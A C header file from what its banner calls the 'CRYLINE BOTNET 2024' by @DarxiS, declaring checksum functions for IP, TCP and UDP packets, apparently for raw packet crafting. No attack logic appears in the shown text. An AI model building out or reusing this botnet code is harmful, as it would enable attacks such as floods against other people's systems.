/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

#pragma once

#include <stdint.h>
#include <linux/ip.h>

#include "LIBRARIES.h"

uint16_t __CHECK_SUM_GENERIC(uint16_t *, uint32_t);
uint16_t __CHECK_SUM_TCP_AND_UDP(struct iphdr *, void *, uint16_t, int);
